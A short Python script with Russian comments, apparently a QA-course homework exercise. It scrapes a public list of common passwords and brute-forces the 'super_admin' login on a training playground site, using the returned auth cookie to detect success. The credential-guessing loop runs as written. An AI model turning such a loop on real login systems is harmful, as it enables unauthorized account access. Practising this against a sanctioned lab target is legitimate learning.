import requests
from bs4 import BeautifulSoup

# Парсим страницу и извлекаем значения для поля password
response_splash_data = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
soup = BeautifulSoup(response_splash_data.text, 'lxml')
parser_data = soup.find_all('table', class_="wikitable")[1].find_all('td', align="left")
splash_data = []
# Извлекаем только значения, убираем дубли password
for i in range(len(parser_data)):
    parser_text = parser_data[i].getText()
    splash_data.append(parser_text.rstrip('\n'))
unique_splash_data = list(dict.fromkeys(splash_data))

# Получаем куки после ввода логин : пароль, передаем в check_auth_cookie и получаем валидный пароль
for i in range(len(unique_splash_data)):
    password_data = unique_splash_data[i]
    response_password = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": password_data})
    auth_cookie = response_password.cookies.get('auth_cookie')
    response_cookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": auth_cookie})
    text = response_cookie.text
    if text == "You are authorized":
        print("Valid password:", password_data)
        print(text)
        break